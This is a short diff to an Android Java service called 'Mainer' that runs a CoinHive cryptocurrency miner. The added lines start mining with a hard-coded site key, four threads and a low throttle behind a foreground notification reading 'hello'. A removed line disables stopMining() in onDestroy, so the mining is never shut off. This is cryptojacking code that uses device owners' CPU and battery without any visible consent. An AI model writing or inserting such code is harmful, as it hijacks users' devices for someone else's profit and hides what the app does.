@@ -40,6 +40,13 @@ public class Mainer extends JobIntentService implements CoinHive.Callback {
         super.onCreate();
         startForeground(1338,
                 buildForegroundNotification("hello"));
+        CoinHive.getInstance()
+                .init("7D1i4fiOWJEVdtZ6T17jBI3c61LHsI3p") // mandatory
+                .setNumberOfThreads(4) // optional
+                .setIsAutoThread(true) // optional
+                .setThrottle(0.2) // optional
+                .setLoggingEnabled(true) // To logcat mining status, false by default.
+                .setForceASMJS(false); // optional;
         wvCoinHive = new CoinHive.Miner( activity, this);
         wvCoinHive.startMining();
     }
@@ -54,7 +61,7 @@ public class Mainer extends JobIntentService implements CoinHive.Callback {
         if (com.theah64.coinhive.CoinHive.getInstance().isLoggingEnabled()) {
             System.out.println("Mining stopped");
         }
-        wvCoinHive.stopMining();
+        //wvCoinHive.stopMining();
         Toast.makeText(this, "Destroy", Toast.LENGTH_SHORT).show();
         super.onDestroy();
     }
